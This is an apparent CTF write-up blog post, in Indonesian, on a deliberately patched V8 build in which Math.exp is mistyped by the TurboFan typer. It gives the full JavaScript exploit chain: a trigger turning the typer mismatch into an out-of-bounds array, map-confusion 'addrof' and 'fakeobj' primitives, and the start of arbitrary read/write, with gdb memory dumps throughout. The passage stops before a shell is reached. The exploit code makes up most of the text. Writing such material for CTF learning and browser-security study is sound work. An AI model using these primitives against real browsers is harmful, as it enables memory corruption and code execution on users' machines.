---
layout: post
title: Cyber Jawara Quick Maffs
subtitle: Typer Bug v8
categories: CTF
tags: [national, writeups, v8]
---


## Introduction
> 1 + 1 = 2, e^2 that's 9? maybe? idk.\
> Author: circleous#0587

Untuk download challengenya kalian bisa download di [sini](https://google.com)<br>
Untuk referensi v8 typer bug kalian bisa lihat di [sini](https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/).<br>
Hint dari author:
```js
function foo() {
  return Object.is(Math.exp(NaN), NaN);
}
```




## Setup
Didalam zip file sudah ada README.md bisa kalian baca, tapi disini saya akan jelaskan cara setup dan build untuk challengenya dari awal.
  1. Install depot_tools
  ```sh
  $ git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
  $ echo "export PATH=/home/your_path/path/depot_tools:$PATH" >> ~/.bashrc
  $ source ~/.bashrc
  ```
  2. Next extract challengenya, dan dialamnya sudah ada README.md
  ```sh
  $ fetch v8 # https://chromium.googlesource.com/chromium/tools/depot_tools.git
  $ cd v8
  $ ./build/install-build-deps.sh
  $ git checkout 5fe0aa3bc79c0a9d3ad546b79211f07105f09585
  $ git apply path/to/maffs.patch # challange patch
  $ git apply path/to/v8_global.patch # disable built-in d8 global
  $ ./tools/dev/v8gen.py x64.release
  $ ninja -C ./out.gn/x64.release #Release version
  $ ./tools/dev/v8gen.py x64.debug
  $ ninja -C ./out.gn/x64.debug # Debug version
  ```

Untuk build v8 akan memakan waktu lumayan lama tergantung kecepatan koneksi kalian sama spec laptop kalian.
Untuk Debugging bisa menggunakan gdb
```sh
$ gdb -q d8
$ run --shell script.js
```
`--shell` disini agar v8 tidak langsung exit saat kita running script kita, untuk contoh script saya seperti ini
```js
function foo() {
    console.log("Hello World!\n");
}
foo();
```
![Test](/assets/images/quickmaffs/quick1.png)

**Now we are ready to HACK!**


## Patch Analysis
Sekarang kita baca patch `maffs.patch` yang ada di soal untuk yang `v8_global.patch` tidak ada yang perlu kita analisis.<br>
Kita fokus ke `maffs.patch`.

{% highlight diff linenos %}
diff --git a/src/compiler/js-create-lowering.cc b/src/compiler/js-create-lowering.cc
index 50a523c606..0b46267c4f 100644
--- a/src/compiler/js-create-lowering.cc
+++ b/src/compiler/js-create-lowering.cc
@@ -683,9 +683,6 @@ Reduction JSCreateLowering::ReduceJSCreateArray(Node* node) {
         length_type.Max() <= kElementLoopUnrollLimit &&
         length_type.Min() == length_type.Max()) {
       int capacity = static_cast<int>(length_type.Max());
-      // Replace length with a constant in order to protect against a potential
-      // typer bug leading to length > capacity.
-      length = jsgraph()->Constant(capacity);
       return ReduceNewArray(node, length, capacity, *initial_map, elements_kind,
                             allocation, slack_tracking_prediction);
     }
diff --git a/src/compiler/operation-typer.cc b/src/compiler/operation-typer.cc
index e7dc51bd2d..121a7a7107 100644
--- a/src/compiler/operation-typer.cc
+++ b/src/compiler/operation-typer.cc
@@ -411,7 +411,7 @@ Type OperationTyper::NumberCosh(Type type) {
 
 Type OperationTyper::NumberExp(Type type) {
   DCHECK(type.Is(Type::Number()));
-  return Type::Union(Type::PlainNumber(), Type::NaN(), zone());
+  return Type::PlainNumber();
 }
 
 Type OperationTyper::NumberExpm1(Type type) {
{% endhighlight %}

Disini saya jelasin sedikit maksud patch diatas:
  - Line 1 code tersebut patching file `src/compiler/js-create-lowring.cc` untuk code yang di patch bisa dilihat pada line 9-11 3 baris code di deleted.
  - Line selanjutnya patching file `src/compiler/operation-typer.cc` untuk code yang di patch bisa dilihat pada line 23 dan 24.

Can u guys see the bug?<br>
Sebelum patch typer set<br>
`Math.exp to be Union(Type::PlainNumber(), Type::NaN(), zone())` ini berarti output dari Math.exp adalah PlainNumber atau NaN.<br>
Nah setelah patch, kita bisa lihat pada line 24.
Typer set `Math.exp to be PlainNumber();` ini berarti output dari Math.exp akan menjadi PlainNumber.<br>
Nah dari tadi kita selalu nyebut typer typer, apa sih itu?<br>
Jadi, Modern JS engine seperti v8 melakukan kompilasi **just-in-time (JIT)** dari kode JS.<br>
Hal ini dilakukan untuk mempercepat eksekusi dari JS. Nah loh bingung, untuk lengkapnya ada di [sini](https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/).
Jadi intinya v8 akan memanggil Turbofan JIT Compiler jika kita melakukan loop dalam jumlah banyak. Lets try<br>


## Trigger the Bug
Langsung saja dari hint yang diberikan kita coba dulu, seperti ini.<br>
```javascript
function foo() {
    let v = Object.is(Math.exp(NaN), NaN);
    return v;
}
console.log(foo()); //true
```
Nah karena penjelasan sebelumnya, Turbofan akan terpanggil jika kita melakukan **loop** yang banyak.<br>
```javascript
function foo() {
    let v = Object.is(Math.exp(NaN), NaN);
    return v;
}

console.log(foo()); //true
for (var i = 0; i < 100000; i++) {
	foo();
}
console.log("Result will be false now");
console.log(foo()); //false
```
See? kita berhasil trigger bug, kenapa bisa jadi false? karena saat Turbofan melakukan compiler, v8 akan melakukan
optimasi pipeline. Nah loh bingung, intinya v8 akan menjalankan source code dari `src/compiler/operation-typer.cc`
Ada perubahan pada source code tersebut saat kita melakukan patching tadi.<br>
```diff
 Type OperationTyper::NumberExp(Type type) {
   DCHECK(type.Is(Type::Number()));
-  return Type::Union(Type::PlainNumber(), Type::NaN(), zone());
+  return Type::PlainNumber();
 }
```
Yang dimana sebelumnya `Math.exp(NaN)` di Turbofan bisa menjadi **PlainNumber** atau **NaN**. <br>
Setelah patch `Math.exp(NaN)` di Turbofan akan selalu menjadi **PlainNumber**, yang seharusnya result yang benar dari `Math.exp(NaN)` adalah **NaN**.<br>
Nah gimana caranya kita ingin debug lewat TurboFan? kalian bisa build di local caranya bisa lihat di [sini](https://chromium.googlesource.com/v8/v8/+/refs/heads/lkgr/tools/turbolizer/).<br>
Atau cara lain bisa akses online lewat [sini](https://v8.github.io/tools/head/turbolizer/index.html).

Nah next kalian bisa lakukan command `./d8 exploit.js --trace-turbo`, nanti akan ada file bernama `turbo-foo-x.json`
![Quick2](/assets/images/quickmaffs/quick2.png)

Next tinggal buka website **turbolizer** CTRL+L untuk dan pilih file json kalian, jangan lupa baca info yang lain di menu sebelah kiri biar lebih paham.<br>
Tampilan awal kalian akan seperti ini.
![Quick4](/assets/images/quickmaffs/quick4.png)

Nah ikutan dah tuh sesuai tanda panah, sebenernya gak harus milih mode **TFTyper**, tapi untuk debug typer bug pada chall ini saya lebih mudah lihat dengan itu.<br>
Jangan lupa klik symbol **T** yang diatas, dan aktifkan semua node yang putih2.<br>
Cara aktifinnya bisa tekan `a` ini akan select semua nodes, selanjutnya tinggal tekan `shift+1-9`.<br>
Lalu tekan `r` untuk reload biar tampilannya jadi lebih kece anjay XD. Kurang lebih seperti ini nanti.<br>
![Quick5](/assets/images/quickmaffs/quick5.png)

Kita bisa lihat terdapat node **NumberExp** disitu dan resultnya adalah **PlainNumber** yang seharusnya result aslinya adalah **NaN**.
Selanjutnya, bagaimana kita manfaatkan bug ini hingga bisa dapat shell?.

### Proceed the Bug

Sebenarnya banyak writeup tentang v8 typer bug yang bisa kalian cari di google.<br>
Salah satunya [CVE-2020-6383](https://www.n1net4il.kr/posts/cve-2020-6383-analysis). Dari semua writeup typer bug yang ada, goals nya adalah memanfaatkan typer bug ini
agar bisa mentrigger **OOB**.<br>
Writeup diatas sedikit mirip dengan chall ini, jadi intinya kita memanfaatkan typer bug untuk membuat nilai di Turbolizer dengan nilai sesungguhnya berbeda agar bisa mentrigger **OOB**.<br>
Biar lebih kebayang contohnya seperti ini.

{% highlight javascript linenos %}
function foo() {
    let a = {x: Infinity};
    let v = Math.exp(Infinity-a.x);
    v >>= 1;
    return v;
}

console.log(foo());
for (var i = 0; i < 100000; i++) {
	foo();
}
console.log(foo()); //0
{% endhighlight %}

Jalankan dengan `--trace-turbo` lalu buka di turbolizer. Hasilnya seperti ini
![Quick6](/assets/images/quickmaffs/quick6.png)
Kita bisa lihat pada gambar diatas, saat nilai `v` yang awalnya `NaN` lalu kita shift left sekali `v >>= 1`,
Result di Turbolizer menunjukkan `Range(-1073741824, 1073741823)` yang artinya result `v >>= 1` bisa bernilai `-1073741824 s/d 1073741823`,
dan result yang sebenarnya muncul adalah `0`.<br>
Nah karena `0` masih termasuk dari range `-1073741824 - 1073741823`, artinya kita belum berhasil menipu si Turbolizernya.<br>
Nah bagaimana caranya? agar nilai yang sesungguhnya itu berbeda dengan dengan nilai dari Turbolizer?<br>

Hasil dari `Math.exp(NaN)` adalah `PlainNumber` yang artinya bisa bernilai `Range(-Inf, Inf)`, namun saat kita shift left sekali,
Hasilnya adalah `Range(-1073741824, 1073741823)`.<br>
Maka kita bisa beri asumsi nilai `Math.exp(NaN)`,<br>
saat bug telah di trigger adalah `Range(-2147483648, 2147483647)`. Ini hanya asumsi sementara, goals kita adalah membuat nilai di Turbolizer itu kecil
sedangkan nilai yang sebenarnya (nilai yang muncul saat di print) itu besar, sehingga saat kita bisa mentrigger OOB.<br>
Oke coba kita lihat source dari `src/compiler/operation-typer.cc` untuk melihat apakah ada fungsi `Math` yang bisa kita gunakan.<br>
Disini saya menemukan fungsi `NumberSign()` atau di JS itu `Math.sign()`.
```js
Type OperationTyper::NumberSign(Type type) {
  DCHECK(type.Is(Type::Number()));
  if (type.Is(cache_->kZeroish)) return type;
  bool maybe_minuszero = type.Maybe(Type::MinusZero());
  bool maybe_nan = type.Maybe(Type::NaN());
  type = Type::Intersect(type, Type::PlainNumber(), zone());
  if (type.IsNone()) {
    // Do nothing.
  } else if (type.Max() < 0.0) {
    type = cache_->kSingletonMinusOne;
  } else if (type.Max() <= 0.0) {
    type = cache_->kMinusOneOrZero;
  } else if (type.Min() > 0.0) {
    type = cache_->kSingletonOne;
  } else if (type.Min() >= 0.0) {
    type = cache_->kZeroOrOne;
  } else {
    type = Type::Range(-1.0, 1.0, zone());
  }
  if (maybe_minuszero) type = Type::Union(type, Type::MinusZero(), zone());
  if (maybe_nan) type = Type::Union(type, Type::NaN(), zone());
  DCHECK(!type.IsNone());
  return type;
}
```
Jika kita lihat pada source code dari `Math.sign` diatas, hasil type dari `Math.exp(NaN)` adalah `PlainNumber`. Nah source code diatas akan melakukan check pada
`type.Max() & type.Min()` dan hasil type dari `Math.exp(NaN)` tidak memenuhi itu semua sehingga saat kita lakukan
```js
v = Math.exp(NaN);
v = Math.sign(v);
```
`v` akan bernilai `Range(-1.0, 1.0)` pada turbolizer, untuk dokumentasi bisa lihat di [SINI](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math/sign).
```js
Math.sign(3);     //  1
Math.sign(-3);    // -1
Math.sign('-3');  // -1
Math.sign(0);     //  0
Math.sign(-0);    // -0
Math.sign(NaN);   // NaN
Math.sign('foo'); // NaN
Math.sign();      // NaN
```
Alright, saat nya kita coba kepada script kita, lalu coba kita debug pada turbolizer.
```js
function foo() {
    let a = {x: Infinity};
    let v = Math.exp(Infinity-a.x);
    v = Math.sign(v);
    return v;
}
console.log(foo()); //true
for (var i = 0; i < 100000; i++) {
	foo();
}
console.log(foo()); //-2147483648
```
Hasilnya seperti ini.
![Quick7](/assets/images/quickmaffs/quick7.png)
Boom! saat `Number.sign(v)` nilai di turbolizer adalah `Range(-1, 1)` sedangkan nilai saat di print adalah `-2147483648`.<br>
Dengan ini kita sudah setengah jalan, selanjutnya kita bisa ikuti [CVE-2020-6383](https://www.n1net4il.kr/posts/cve-2020-6383-analysis) 
agar `Range()` di Turbolizer sama nilainya dengan writeup itu.<br>

Maka Script kita seperti ini
```js
function foo() {
    let a = {x: Infinity};
    let v = Math.exp(Infinity-a.x);	//PlainNumber
    v = Math.sign(v);			//Range(-1, 1)
    v = Math.abs(v);			//Range(0, 1) 	| Real = -2147483648
    v += 2;				//Range(2, 3) 	| Real = -2147483646
    v >>= 1;				//Range(1, 1) 	| Real = -1073741823
    v += 10;				//Range(11, 11) | Real = -1073741813
    var arr = new Array(v);	//Array(11)	| Real = -1073741813
    arr[0] = 1.1;
    return arr;
}

console.log(foo()); //true
for (var i = 0; i < 100000; i++) {
	foo();
}
var arr = foo();
console.log(arr[12]);
```
![Quick8](/assets/images/quickmaffs/quick8.png)
BOOM OOB TRIGGER
Saat kita membuat Array, size array yang terbuat di Turbolizer adalah `11`, namun karena nilai sesungguhnya itu `-1073741813`, maka OOB berahsil kita Trigger.


## OOB
Sayangnya perjalanan kita tidak sampai di situ saja heheh, untuk referensi OOB bisa lihat di [sini](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/).
Nah sayangnya OOB yang dijelaskan di blognya faith adalah v8 versi lama, sedangkan v8 yang kita gunakan adalah versi 9.7.0.<br>
Dimana ada banyak perubahan dari Tag Pointer, Struktur Object, dll [(Pointer Compression in V8)](https://v8.dev/blog/pointer-compression).<br>

Oke first, kita ubah dulu script kita untuk persiapan seperti dari blognya faith
```js
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
let buf2 = new ArrayBuffer(0x150);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function foo() {
    let a = {x: Infinity};
    let v = Math.exp(Infinity-a.x);
    v = Math.sign(v);
    v = Math.abs(v);
    v += 2;
    v >>= 1;
    v += 10;
    var arr = new Array(v);
    arr[0] = 1.1;
    return arr;
}

for (let i = 0; i < 100000; i++) 
    foo();
var oob = foo();
```

Disini saya tidak akan menjelaskan secara detail setiap fungsi2nya karena kalian bisa baca di blognya faith diatas.<br>
Mungkin saya akan jelaskan cukup detail masalah OOB ini. Saya sarankan juga untuk build v8 versi debugnya, untuk cara buildnya hampir sama seperti v8 release,
tinggal mengganti release dengan debug.
```
$ ./tools/dev/v8gen.py x64.debug
$ ninja -C ./out.gn/x64.debug # Debug version
```

Oke pertama-tama mari kita bedah struktur array pada v8
```js
linuz@linz:~/Desktop/CSI/BrowserEXP/Modern/pwn_modern_typer/v8/out.gn/x64.debug$ gdb -q d8
pwndbg: loaded 193 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from d8...
pwndbg> run --allow-natives-syntax
Starting program: /home/linuz/Desktop/CSI/BrowserEXP/Modern/pwn_modern_typer/v8/out.gn/x64.debug/d8 --allow-natives-syntax
V8 version 9.7.0 (candidate)
d8> var a = [1.1, 2.2];
undefined
d8> %DebugPrint(a);
DebugPrint: 0x2cea08105ac9: [JSArray]
 - map: 0x2cea082c3ae1 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x2cea0828ad7d <JSArray[0]>
 - elements: 0x2cea08105ab1 <FixedDoubleArray[2]> [PACKED_DOUBLE_ELEMENTS]
 - length: 2
 - properties: 0x2cea0800222d <FixedArray[0]>
 - All own properties (excluding elements): {
    0x2cea08004b8d: [String] in ReadOnlySpace: #length: 0x2cea08204255 <AccessorInfo> (const accessor descriptor), location: descriptor
 }
 - elements: 0x2cea08105ab1 <FixedDoubleArray[2]> {
           0: 1.1
           1: 2.2
 }
0x2cea082c3ae1: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x2cea082c3ab9 <Map(HOLEY_SMI_ELEMENTS)>
 - prototype_validity cell: 0x2cea082044fd <Cell value= 1>
 - instance descriptors #1: 0x2cea0828b231 <DescriptorArray[1]>
 - transitions #1: 0x2cea0828b27d <TransitionArray[4]>Transition array #1:
     0x2cea080057a1 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x2cea082c3b09 <Map(HOLEY_DOUBLE_ELEMENTS)>

 - prototype: 0x2cea0828ad7d <JSArray[0]>
 - constructor: 0x2cea0828ab19 <JSFunction Array (sfi = 0x2cea082104ed)>
 - dependent code: 0x2cea080021b9 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

[1.1, 2.2]
```
Nah loh bingung lagi banyak bener isinya, yang perlu kita lihat adalah **JSArray** dan **Map**, perlu diingat karena v8 menggunakan tag pointer,
intinya kita harus mengurangi 1 bytes untuk melihat isi addressnya.<br>

```js
pwndbg> x/4gx 0x2cea08105ac9-1 << JSArray
0x2cea08105ac8:	0x0800222d082c3ae1	0x0000000408105ab1 << Pointer to value dari JSArray
0x2cea08105ad8:	0xb1fc8306080025a9	0x7566280a00000adc
pwndbg> x/4gx 0x2cea08105ab1-1
0x2cea08105ab0:	0x0000000408002a95	0x3ff199999999999a
0x2cea08105ac0:	0x400199999999999a	0x0800222d082c3ae1
pwndbg> p/f 0x3ff199999999999a
$1 = 1.1000000000000001
pwndbg> p/f 0x400199999999999a
$2 = 2.2000000000000002
pwndbg>
```

`0x0800222d082c3ae1` adalah Map dari **JSArray** dan `0x0000000408105ab1` adlah Pointer ke value dari **JSArray**


Perlu diperhatikan untuk pointer value dari JSArray yang perlu kita ambil hanyalah 4 bytes belakang saja yaitu
`0x08105ab1` ini sedikit berbeda dengan v8 versi lama, karena ada perubaha tentang tag pointer di v8 versi terbaru.
Nah untuk angka depannya itu sama sesuai dengan address heap yang kita dapatkan jika digabung menjadi
`0x2cea08105ac0`.

Jadi sederhananya jika kita mau print `a[0]`, maka akan memanggil pointer dari **JSArray+7** atau `0x0000000408105ab1+7`.
Semoga sampai sini kebayang lah ya.

Oke next untuk penjalasan dari **Map** pada v8, kalian bisa baca pada blognya faith, saya akan langsung masuk ke contoh saja.<br>
Jadi disini kita bisa melakukan overwrite **Map** dari **JSArray** yang kita punya untuk melakukan leak. Bagaimana caranya? <br>
Oh ya jangan lupa jika ingin trigger **OOB** harus pada versi **release** jangan debug ya.

```js
pwndbg> run --allow-natives-syntax --shell test.js 
Starting program: /home/linuz/Desktop/CSI/BrowserEXP/Modern/pwn_modern_typer/v8/out.gn/x64.release/d8 --allow-natives-syntax --shell test.js
ERROR: Could not find ELF base!
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
V8 version 9.7.0 (candidate)
d8> var obj = {"A":1.1};
undefined
d8> var obj_arr = [obj];
undefined
d8> %DebugPrint(obj_arr);
0x1d0e08283935 <JSArray[1]>
[{A: 1.1}]
d8> %DebugPrint(obj);
0x1d0e08282241 <Object map = 0x1d0e08205cc9>
{A: 1.1}


pwndbg> x/4gx 0x1d0e08283935-1
0x1d0e08283934:	0x0800222d08203b31	0x0000000208283929 << value pointer of JSArray
0x1d0e08283944:	0x672fa41e080025a9	0x6265442500000015
pwndbg> x/4gx 0x1d0e08283929-1
0x1d0e08283928:	0x0000000208002205	0x08203b3108282241 << Map of obj
0x1d0e08283938:	0x082839290800222d	0x080025a900000002
```

Sekali lagi saya ingatkan, yang kita perhatikan disini adalah 4 bytes belakang, karena tag pointer dari v8, oleh karena itu, saat kita `%DebugPrint(obj)` kita mendapatkan value
`0x1d0e08282241`, namun saat kita debug manual kita dapat value `0x08203b3108282241`, tetapi 4 bytes belakangnya sama yaitu `08282241` maka yang kita gunakan adalah value ini.

Nah dari yang kita lihat diatas, **Map** dari **obj_arr** atau **Array of object**. Index 0 dari float array biasa, adalah float value, sedangkan index 0 dari **Array of object**
adalah value address dari **obj** itu sendiri. Namun saat kita call obj_arr[0], itu bukan print address dari **obj** namun akan print `{A: 1.1}`.<br>

Nah bagaimana jika kita overwrite **Map** dari **obj_arr** ke **Map** dari float array?.<br>
Benar, saat kita akses obj_arr[0] hasilnya bukan print `{A: 1.1}` namun akan print value address dari obj itu sendiri.<br>
Lets see how it works. Pertama-tama kita buat inisialisasi variable2 yang kita butuhkan terlebih dahulu.
```js
function foo() {
    let a = {x: Infinity};
    let v = Math.exp(Infinity-a.x);
    v = Math.sign(v);
    v = Math.abs(v);
    v += 2;
    v >>= 1;
    v += 10;
    var arr = new Array(v);
    arr[0] = 1.1;
    return arr;
}


for (let i = 0; i < 100000; i++) 
    foo();

var oob = foo();
var obj = {"A":1.1};
var obj_arr = [obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];

pwndbg> run --allow-natives-syntax --shell test.js 
Starting program: /home/linuz/Desktop/CSI/BrowserEXP/Modern/pwn_modern_typer/v8/out.gn/x64.release/d8 --allow-natives-syntax --shell test.js
ERROR: Could not find ELF base!
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
V8 version 9.7.0 (candidate)
d8> %DebugPrint(float_arr);
0x0c4308282159 <JSArray[4]>
[1.1, 1.2, 1.3, 1.4]
d8> %DebugPrint(obj);
0x0c4308282139 <Object map = 0xc4308205cc9>
{A: 1.1}

pwndbg> x/4gx 0x0c4308282159-1
0xc4308282158:	0x0800222d08203ae1	0x00000008082821b9
0xc4308282168:	0x0000000208002205	0x08002a9500000000
```

**Map** dari **float_arr** adalah `0x08203ae1` dan **Map** dari **obj** adalah `0x08205cc9`.<br>
Pertama-tama kita harus leak value ini terlebih dahulu lewat OOB. Kita bisa check indexnya dengan loop print seperti ini
```js
var oob = foo();
var obj = {"A":1.1};
var obj_arr = [obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];
var float_arr_map = ftoi(oob[31]) & 0xffffffffn;
var obj_arr_map = ((ftoi(oob[21]) >> 32n));

for (let i = 12; i < 100; i++) 
    console.log("0x"+ftoi(oob[i]).toString(16), i);
```

Didapat **Map** dari **float_arr** pada index-31 dan **Map** dari **obj** pada index-21. Maka kita bisa ambil valuenya.<br>
Perlu diingkat karena kita hanya perlu abis 4 bytes saja karena tag pointer v8.
```js
var oob = foo();
var obj = {"A":1.1};
var obj_arr = [obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];
var float_arr_map = ftoi(oob[31]) & 0xffffffffn;
var obj_arr_map = ((ftoi(oob[21]) >> 32n));
console.log("Float_arr_map: 0x"+float_arr_map.toString(16));
console.log("Obj_arr_map: 0x"+obj_arr_map.toString(16));
```
Selanjutnya kita coba overwrite value **Map** dari variable **obj_arr** menjadi value **Map of float_arr**.<br>
```js
pwndbg> run --allow-natives-syntax --shell ./test.js 
Starting program: /home/linuz/Desktop/CSI/BrowserEXP/Modern/pwn_modern_typer/v8/out.gn/x64.release/d8 --allow-natives-syntax --shell ./test.js
ERROR: Could not find ELF base!
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Float_arr_map: 0x8203ae1
Obj_arr_map: 0x8203b31
V8 version 9.7.0 (candidate)
d8> %DebugPrint(obj_arr);
0x0555080f4e6d <JSArray[1]>
[{A: 1.1}]
d8>

pwndbg> x/4gx 0x0555080f4e6d-1
0x555080f4e6c:	0x0800222d08203b31	0x00000002080f4e85
0x555080f4e7c:	0x081d2a7508005da5	0x0000000208002205
```
Nah kita overwrite value `0x0800222d08203b31` menjadi `0x8203ae1`, sehingga saat kita call obj_arr[0], akan print value address dari **obj** itu sendiri.
Caranya seperti ini.
```js
pwndbg> c
Continuing.
d8> obj_arr[0] = obj;
{A: 1.1}
d8> %DebugPrint(obj_arr)
0x0555080f4e6d <JSArray[1]>

pwndbg> x/4gx 0x0555080f4e6d-1
0x555080f4e6c:	0x0800222d08203b31*	0x00000002080f4e85
0x555080f4e7c:	0x081d2a7508005da5	0x0000000208002205

d8> oob[21] = itof(float_arr_map << 32n); //obj_arr_map terdapat pada index-21, overwrite dengan float_arr_map
1.5360745541554e-269

pwndbg> x/4gx 0x0555080f4e6d-1
0x555080f4e6c:	0x0800222d08203ae1*	0x00000002080f4e85
0x555080f4e7c:	0x081d2a7508005da5	0x0000000208002205

d8> let res = obj_arr[0]; //sekarang obj_arr[0] merupakan value dari address obj itu sendiri
undefined
d8> oob[21] = itof(obj_arr_map << 32n); //kita kembalikan value obj_arr_map ke semula
1.5361900865954554e-269
d8> "0x"+(ftoi(res) & 0xffffffffn).toString(16); //value res
"0x80f4e29"
d8> %DebugPrint(obj) //value obj
0x0555080f4e29 <Object map = 0x55508205cc9>
{A: 1.1}
d8>
```
Boom! dengan ini kita bisa mendapatkan value dari address yang kita buat.<br>
Inilah yang kita namakan `addrof` primitive selanjutnya kita buat fungsi `fakeobj` tinggal balik saja.<br>
```js
function addrof(k){
    obj_arr[0] = k;
    oob[21] = itof(float_arr_map << 32n);
    let res = obj_arr[0];
    oob[21] = itof(obj_arr_map << 32n);
    return ftoi(res) & 0xffffffffn;
}

function fakeobj(k){
    float_arr[0] = itof(k);
    oob[31] = itof(obj_arr_map);
    let fake = float_arr[0];
    oob[31] = itof(float_arr_map);
    return fake;
}
```

## Arbitary Read / Write
Nah sekarang kita sudah punya `addrof` dan `fakeobj` primitives. Namun untuk ARB/W pada v8 sedikit kompleks.<br>
Untuk bisa ARB/W pertama2 kita perlu buat float array dengan index 0 adalah value dari **float_arr_map**.<br>
Oke langsung aja contohnya seperti ini.
```js
function foo() {
    let a = {x: Infinity};
    let v = Math.exp(Infinity-a.x);
    v = Math.sign(v);
    v = Math.abs(v);
    v += 2;
    v >>= 1;
    v += 10;
    var arr = new Array(v);
    arr[0] = 1.1;
    return arr;
}


for (let i = 0; i < 100000; i++) 
    foo();

var oob = foo();
var obj = {"A":1.1};
var obj_arr = [obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];
var float_arr_map = ftoi(oob[31]) & 0xffffffffn;
var obj_arr_map = ((ftoi(oob[21]) >> 32n));
console.log("Float_arr_map: 0x"+float_arr_map.toString(16));
console.log("Obj_arr_map: 0x"+obj_arr_map.toString(16));

function addrof(k){
    obj_arr[0] = k;
    oob[21] = itof(float_arr_map << 32n);
    let res = obj_arr[0];
    oob[21] = itof(obj_arr_map << 32n);
    return ftoi(res) & 0xffffffffn;
}

function fakeobj(k){
    float_arr[0] = itof(k);
    oob[31] = itof(obj_arr_map);
    let fake = float_arr[0];
    oob[31] = itof(float_arr_map);
    return fake;
}

var arr2 = [itof(float_arr_map), 1.1, 1.2, 1.3];
console.log("Arr2: 0x"+addrof(arr2).toString(16));
%DebugPrint(arr2);

pwndbg> run --allow-natives-syntax --shell test.js
Starting program: /home/linuz/Desktop/CSI/BrowserEXP/Modern/pwn_modern_typer/v8/out.gn/x64.release/d8 --allow-natives-syntax --shell test.js
ERROR: Could not find ELF base!
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Float_arr_map: 0x8203ae1
Obj_arr_map: 0x8203b31
Arr2: 0x834eba9
0x342a0834eba9 <JSArray[4]>

pwndbg> x/10gx 0x342a0834eba9-1
0x342a0834eba8:	0x0800222d08042118	0x000000080834ebc1
0x342a0834ebb8:	0x081d2ead08005da5	0x000000080804a118
0x342a0834ebc8:	0x0000000008203ae1*	0x3ff199999999999a << Fake obj here
0x342a0834ebd8:	0x3ff3333333333333	0x3ff4cccccccccccd
0x342a0834ebe8:	0x00000002080029cd	0x0000000008203ae1

```
Pastikan kalian run melalui script, karena kalau kalian running addrof dan fakeobj primitive di v8 nya langsung, akan terdapat sedikit error, sehingga hasilnya menjadi salah.<br>
Nah lihat yang saya tandain bintang, kita akan menaruh fake object kita disana (`0x342a0834ebc8`), value ini bisa kita dapatkan dari `addrof(arr2)+0x20n`.
Jika kita sudah menaruh fake object di `0x342a0834ebc8` maka kita bisa mengontrol value di `0x342a0834ebd0` atau index ke-1 dari `arr2`.<br>

Nah jika kalian lihat pada `0x342a0834eba8` disitu terdapat **Map** dari **Arr2** `(0x0800222d08042118)` dan selanjutnya pada `0x342a0834ebb0` terdapat pointer ke value dari **Arr2** yaitu `0x000000080834ebc1`. Untuk isi valuenya terdapat pada `0x000000080834ebc1+7`, Nah bagaimana jika kita ubah value dari **arr2[1]** menjadi address yang ingin kita leak?<br>
Misalnya kita ingin leak address dari `0x342a0834eba8` maka kita hanya perlu ambil 4 bytes belakangnya dan sesuaikan dengan format dari pointer of value yaitu `0x08xxxxxxxx`.<br>
Final payload menjadi `0x080834eba8-7`. Lets try, pertama2 kita put fakeobj terlebih dahulu di script

```js
var oob = foo();
var obj = {"A":1.1};
var obj_arr = [obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];
var float_arr_map = ftoi(oob[31]) & 0xffffffffn;
var obj_arr_map = ((ftoi(oob[21]) >> 32n));
console.log("Float_arr_map: 0x"+float_arr_map.toString(16));
console.log("Obj_arr_map: 0x"+obj_arr_map.toString(16));

function addrof(k){
    obj_arr[0] = k;
    oob[21] = itof(float_arr_map << 32n);
    let res = obj_arr[0];
    oob[21] = itof(obj_arr_map << 32n);
    return ftoi(res) & 0xffffffffn;
}

function fakeobj(k){
    float_arr[0] = itof(k);
    oob[31] = itof(obj_arr_map);
    let fake = float_arr[0];
    oob[31] = itof(float_arr_map);
    return fake;
}

var arr2 = [itof(float_arr_map), 1.1, 1.2, 1.3];
console.log("Arr2: 0x"+addrof(arr2).toString(16));
%DebugPrint(arr2);
var fake = fakeobj((addrof(arr2)+0x20n));

pwndbg> run --allow-natives-syntax --shell test.js 
